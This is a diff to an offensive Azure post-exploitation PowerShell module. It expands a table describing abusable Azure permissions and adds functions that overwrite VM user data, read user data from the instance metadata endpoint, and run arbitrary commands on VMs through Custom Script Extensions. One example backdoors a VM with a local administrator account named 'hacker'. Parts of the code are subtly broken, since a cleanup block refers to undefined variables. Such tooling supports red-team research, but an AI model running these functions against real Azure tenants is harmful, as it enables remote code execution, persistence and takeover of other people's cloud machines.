@@ -18,36 +18,41 @@
 #
 
 $KnownDangerousPermissions = @{      
-    '`*/`*'                          = 'UNLIMITED PRIVILEGES IN THE ENTIRE AZURE SUBSCRIPTION!'
+    '`*/`*'  = 'UNLIMITED PRIVILEGES IN THE ENTIRE AZURE SUBSCRIPTION!'
 
     'storageAccounts/read'                                = 'Allows User to read Storage Accounts and related Blobs'
     'storageAccounts/blobServices/containers/read'        = 'Allows User to read Blobs Containers'
     'storageAccounts/blobServices/containers/blobs/write' = 'Allows Users to upload malicious files to Blob Containers'
 
-    'roleAssignments/write'          = 'Facilitates Privileges Escalation through a malicious Role Assignment'
+    'roleAssignments/write'            = 'Facilitates Privileges Escalation through a malicious Role Assignment'
 
-    'virtualMachines/`*'             = 'Complete control over Azure VM can lead to a machine takeover by Running arbitrary Powershell commands (runCommand)'
-    'virtualMachines/runCommand'     = 'Allows User to Compromise Azure VM by Running arbitrary Powershell commands.'
+    'virtualMachines/`*'               = 'Complete control over Azure VM can lead to a machine takeover by Running arbitrary Powershell commands (runCommand)'
+    'virtualMachines/read'             = 'User can read Azure VMs User Data contents as well as other VMs properties.'
+    'virtualMachines/write'            = 'Partial control over Azure VM can lead to a machine takeover by modification of VMs User Data'
+    'virtualMachines/runCommand'       = 'Allows User to Compromise Azure VM by Running arbitrary Powershell commands.'
+
+    'virtualMachines/extensions/write' = 'User can compromise Azure VM by creating a Custom Script Extension on that VM.'
+    'virtualMachines/extensions/read'  = 'User can read a Custom Script Extension output on a Azure VM, which may contain sensitive data.'
     
-    'secrets/getSecret'              = 'User can read Key Vault Secret contents'
-    'vaults/*/read'                  = 'User can access Key Vault Secrets.'
-    'Microsoft.KeyVault/vaults/`*'   = 'User can access Key Vault Secrets.'
-    'vaults/certificatecas/`*'       = 'User can access Key Vault Certificates'
-    'vaults/certificates/`*'         = 'User can access Key Vault Certificates'
-    'vaults/keys/`*'                 = 'User can access Key Vault Keys'
-    'vaults/secrets/`*'              = 'User can access Key Vault Keys'
+    'secrets/getSecret'                = 'User can read Key Vault Secret contents'
+    'vaults/*/read'                    = 'User can access Key Vault Secrets.'
+    'Microsoft.KeyVault/vaults/`*'     = 'User can access Key Vault Secrets.'
+    'vaults/certificatecas/`*'         = 'User can access Key Vault Certificates'
+    'vaults/certificates/`*'           = 'User can access Key Vault Certificates'
+    'vaults/keys/`*'                   = 'User can access Key Vault Keys'
+    'vaults/secrets/`*'                = 'User can access Key Vault Keys'
 
-    'automationAccounts/`*'          = 'Allows User to compromise Azure VM & Hybrid machines through Azure Automation Runbooks'
-    'automationAccounts/jobs/`*'     = 'Allows User to compromise Azure VM & Hybrid machines through Azure Automation Account Jobs'
-    'automationAccounts/jobs/write'  = 'Allows User to compromise Azure VM & Hybrid machines through Azure Automation Account Jobs'
-    'automationAccounts/runbooks/`*' = 'Allows User to compromise Azure VM & Hybrid machines through Azure Automation Runbooks'
+    'automationAccounts/`*'            = 'Allows User to compromise Azure VM & Hybrid machines through Azure Automation Runbooks'
+    'automationAccounts/jobs/`*'       = 'Allows User to compromise Azure VM & Hybrid machines through Azure Automation Account Jobs'
+    'automationAccounts/jobs/write'    = 'Allows User to compromise Azure VM & Hybrid machines through Azure Automation Account Jobs'
+    'automationAccounts/runbooks/`*'   = 'Allows User to compromise Azure VM & Hybrid machines through Azure Automation Runbooks'
 
     'users/password/update'                    = 'User can reset Other non-admin user passwords'
     'users/authenticationMethods/create'       = 'User can create new Authentication Method on another user'
     'users/authenticationMethods/delete'       = 'User can delete Authentication Method of another user.'
     'users/authenticationMethods/basic/update' = 'User can update authentication methods of another user'
 
-    '/`*'                            = 'Unlimited privileges in a specified Azure Service. May result in data compromise, infiltration and other attacks.'
+    '/`*' = 'Unlimited privileges in a specified Azure Service. May result in data compromise, infiltration and other attacks.'
 }
 
 
@@ -216,7 +221,7 @@ Function Get-ARTWhoami {
     }
 
     if($All -or $AzCli) {
-        Write-Host "`n=== AZ CLI context:" -ForegroundColor Yellow
+        Write-Host "=== AZ CLI context:" -ForegroundColor Yellow
         
         try {
             $AzAcc = az account show | convertfrom-json
@@ -2552,7 +2557,7 @@ Function Get-ARTAccess {
             $res = Get-ARTResource -SubscriptionId $SubscriptionId
 
             if ($res -ne $null) {
-                Write-Host "[+] Accessible Azure Resources & corresponding permissions:" -ForegroundColor Green
+                Write-Host "[+] Accessible Azure Resources & corresponding permissions:`n" -ForegroundColor Green
                 $res
             }
             else {
@@ -3099,7 +3104,7 @@ Function Add-ARTADAppSecret {
 }
 
 
-Function Get-ARTAzureVMPublicIP {
+Function Get-ARTAzVMPublicIP {
     <#
     .SYNOPSIS
         Retrieves Azure VM Public IP address
@@ -3114,7 +3119,7 @@ Function Get-ARTAzureVMPublicIP {
         Target Azure Resource Group name.
 
     .EXAMPLE
-        PS> Get-ARTAzureVMPublicIP -VMName MyVM1
+        PS> Get-ARTAzVMPublicIP -VMName MyVM1
     #>
 
     [CmdletBinding()]
@@ -3403,6 +3408,320 @@ Function Get-ARTResourceGroupDeploymentTemplate {
         Remove-Item -Path $tmpfile.FullName | Out-Null
         Remove-Item -Path $jsonfile | Out-Null
 
+        $ErrorActionPreference = $EA
+    }   
+}
+
+
+Function Update-ARTAzVMUserData {
+    <#
+    .SYNOPSIS
+        Modifies Azure VM User Data script.
+
+    .DESCRIPTION
+        Modifies Azure VM User Data script through a direct API invocation.
+
+    .PARAMETER VMName
+        Name of the Virtual Machine to target.
+
+    .PARAMETER ScriptPath
+        Path to the Powershell script file.
+
+    .PARAMETER Command
+        Command to be executed in Runbook.
+
+    .PARAMETER ResourceGroup
+        Name of the Resource Group where to find target VM. Optional, will look it up in currently chosen resource group.
+
+    .PARAMETER Location
+        Azure Availability Zone Location string where the VM is running, ex: "Germany West Central"
+
+    .PARAMETER SubscriptionId
+        Subscription ID where to find target VM. Optional, will look it up in currently chosen subscription.
+
+    .EXAMPLE
+        Example 1: Shows all visible to current user Azure AD applications, their owners and Service Principals.
+        PS C:\> Update-ARTAzVMUserData -Command "whoami" -VMName infectme -ResourceGroup myresgroup -Location "Germany West Central"
+    #>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True)]
+        [String]
+        $VMName = $null,
+
+        [Parameter(Mandatory=$True)]
+        [String]
+        $ResourceGroup,
+
+        [Parameter(Mandatory=$True)]
+        [String]
+        $Location,
+
+        [String]
+        $ScriptPath = $null,
+
+        [String]
+        $Command = $null,
+
+        [Parameter(Mandatory=$False)]
+        [String]
+        $SubscriptionId = $null
+    )
+
+    try {
+        $EA = $ErrorActionPreference
+        $ErrorActionPreference = 'silentlycontinue'
+        
+        if ($ScriptPath -ne $null -and $Command -ne $null -and $ScriptPath.Length -gt 0 -and $Command.Length -gt 0) {
+            Write-Error "-ScriptPath and -Command are mutually exclusive. Pick one to continue."
+            Return
+        }
+
+        if (($ScriptPath -eq $null -and $Command -eq $null) -or ($ScriptPath.Length -eq 0 -and $Command.Length -eq 0)) {
+            Write-Error "Missing one of the required parameters: -ScriptPath or -Command"
+            Return
+        }
+
+        $createdFile = $false
+
+        if ($Command -ne $null -and $Command.Length -gt 0) {
+            $File = New-TemporaryFile
+            $ScriptPath = $File.FullName
+            Remove-Item $ScriptPath
+            $ScriptPath = $ScriptPath + ".ps1"
+
+            Write-Verbose "Writing supplied commands to a temporary file..."
+            $Command | Out-File $ScriptPath
+            $createdFile = $true
+        }
+
+        $Data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Content $ScriptPath)))
+
+        $AccessToken = Get-ARTAccessTokenAz
+
+        if($AccessToken -eq $null -or $AccessToken.Length -eq 0) {
+            Write-Error "Cannot acquire Azure Management Access Token!"
+            Return
+        }
+
+        if($SubscriptionId -eq $null -or $SubscriptionId.Length -eq 0) {
+            $SubscriptionId = Get-ARTSubscriptionId
+        }
+
+        $URL = "https://management.azure.com/subscriptions/$SubscriptionId/resourceGroups/$ResourceGroup/providers/Microsoft.Compute/virtualMachines/$VMName?api-version=2021-07-01"
+
+        $Body = @(
+            @{
+                location = "$Location"
+                properties = @{
+                    userData = "$Data"
+                }
+            }
+        ) | ConvertTo-Json -Depth 4
+
+        $Headers = @{
+            Authorization = "Bearer $AccessToken"
+        }
+
+        $Results = Invoke-RestMethod -Method Put -Uri $URL -Body $Body -Headers $Headers -ContentType 'application/json'
+
+        if($createdFile) {
+            Remove-Item $ScriptPath
+        }
+
+        $Results
+    }
+    catch {
+        Write-Host "[!] Function failed!" -ForegroundColor Red
+        Throw
+        Return
+    }
+    finally {
+        Remove-Item -Path $tmpfile.FullName | Out-Null
+        Remove-Item -Path $jsonfile | Out-Null
+
+        $ErrorActionPreference = $EA
+    }   
+}
+
+
+Function Get-ARTAzVMUserDataFromInside {
+    <#
+    .SYNOPSIS
+        Retrieves Azure VM User Data from inside of a VM by reaching to Instance Metadata endpoint.
+
+    .DESCRIPTION
+        Retrieves Azure VM User Data from inside of a VM by reaching to Instance Metadata endpoint.
+
+    .EXAMPLE
+        PS C:\> Get-ARTAzVMUserData
+    #>
+
+    Return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text")))
+}
+
+
+Function Set-ARTAzVMExtension {
+    <#
+    .SYNOPSIS
+        Modifies Azure VM Custom Script Extension leading to remote code execution.
+
+    .DESCRIPTION
+        Modifies Azure VM Custom Script Extension leading to remote code execution.
+
+    .PARAMETER VMName
+        Name of the Virtual Machine to target.
+
+    .PARAMETER ExtensionName
+        Name of the Custom Script Extension to abuse.
+
+    .PARAMETER ResourceGroup
+        Name of the Resource Group where to find target VM. Optional, will look it up in currently chosen resource group.
+
+    .PARAMETER ScriptPath
+        Path to the Powershell script file.
+
+    .PARAMETER Command
+        Command to be executed in Runbook.
+
+    .PARAMETER Location
+        Optional. Will be deduced from Get-AzVMExtension. Specifies Azure Availability Zone Location string where the VM is running, ex: "Germany West Central"
+
+    .EXAMPLE
+        Example 1: Backdoors target Azure VM with a new Local Administrator user named "hacker"
+        PS C:\> Set-ARTAzVMExtension -VMName infectme -ResourceGroup myresgroup -ExtensionName ExecMe -Command "powershell net users hacker HackerSecret@1337 /add /Y ; net localgroup administrators hacker /add"
+    #>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True)]
+        [String]
+        $VMName = $null,
+
+        [Parameter(Mandatory=$True)]
+        [String]
+        $ResourceGroup,
+
+        [Parameter(Mandatory=$True)]
+        [String]
+        $ExtensionName,
+
+        [Parameter(Mandatory=$False)]
+        [String]
+        $Location,
+
+        [String]
+        $ScriptPath = $null,
+
+        [String]
+        $Command = $null
+    )
+
+    try {
+        $EA = $ErrorActionPreference
+        $ErrorActionPreference = 'silentlycontinue'
+        
+        if ($ScriptPath -ne $null -and $Command -ne $null -and $ScriptPath.Length -gt 0 -and $Command.Length -gt 0) {
+            Write-Error "-ScriptPath and -Command are mutually exclusive. Pick one to continue."
+            Return
+        }
+
+        if (($ScriptPath -eq $null -and $Command -eq $null) -or ($ScriptPath.Length -eq 0 -and $Command.Length -eq 0)) {
+            Write-Error "Missing one of the required parameters: -ScriptPath or -Command"
+            Return
+        }
+
+        $createdFile = $false
+
+        if ($Command -ne $null -and $Command.Length -gt 0) {
+            $File = New-TemporaryFile
+            $ScriptPath = $File.FullName
+            Remove-Item $ScriptPath
+            $ScriptPath = $ScriptPath + ".ps1"
+
+            Write-Verbose "Writing supplied commands to a temporary file..."
+            $Command | Out-File $ScriptPath
+            $createdFile = $true
+        }
+
+        Write-Verbose "Pulling Azure VM Extensions..."
+        $ableToPullExts = $false
+        try {
+            $ext = Get-AzVMExtension -ResourceGroupName $ResourceGroup -VMName $VMName | ? { $_.Name -eq $ExtensionName }
+
+            if($ext -ne $null) {
+                $Location = $ext.Location
+                $ableToPullExts = $true
+            }
+        }
+        catch {
+            Write-Host "[-] Could not pull Azure VM Extensions!" -ForegroundColor Red
+        }
+
+        if ($Location -eq $null -or $Location.Length -eq 0) {
+            Write-Error "Location must be specified!"
+            Return
+        }
+
+        $Commands = (Get-Content $ScriptPath)
+
+        Write-Verbose "Setting Custom Script Extension with malicious commands..."
+
+        Set-AzVMExtension `
+            -ResourceGroupName $ResourceGroup `
+            -ExtensionName $ExtensionName `
+            -VMName $VMName `
+            -Location $Location `
+            -Publisher Microsoft.Compute `
+            -ExtensionType CustomScriptExtension `
+            -TypeHandlerVersion 1.8 `
+            -SettingString "{`"commandToExecute`":`"$Commands`"}" | Out-Null
+
+        $col = "Yellow"
+        if($ableToPullExts -eq $false) {
+            $col = "Green"
+        }
+
+        Write-Host "[+] Custom Script Extension set." -ForegroundColor $col
+
+        if($ableToPullExts) {
+            Write-Host "[.] Checking if it worked..."
+            try {
+                Start-Sleep -Seconds 5
+                $ext = Get-AzVMExtension -ResourceGroupName $ResourceGroup -VMName $VMName | ? { $_.Name -eq $ExtensionName }
+                $c = ($ext.PublicSettings | ConvertFrom-Json).commandToExecute
+
+                if ($c -eq $Commands) {
+                    Write-Host "[+] Custom Script Extension Attack WORKED!" -ForegroundColor Green
+                }
+                else {
+                    Write-Host "[?] It didn't work?" -ForegroundColor Yellow
+                    Write-Host "Pulled following command to execute:"
+                    Write-Host "----------------------------------------"
+                    Write-Host $c
+                    Write-Host "----------------------------------------"
+                    Write-Host "Whereas expected it to be:"
+                    Write-Host "----------------------------------------"
+                    Write-Host $Commands
+                    Write-Host "----------------------------------------"
+                }
+            }
+            catch {
+                Write-Host "[-] Could not verify whether Custom Script Extension attack worked! Exception was thrown." -ForegroundColor Red
+            }
+        }
+
+        if($createdFile) {
+            Remove-Item $ScriptPath | Out-Null
+        }
+    }
+    catch {
+        Write-Host "[!] Function failed!" -ForegroundColor Red
+        Throw
+        Return
+    }
+    finally {
         $ErrorActionPreference = $EA
     }   
 }
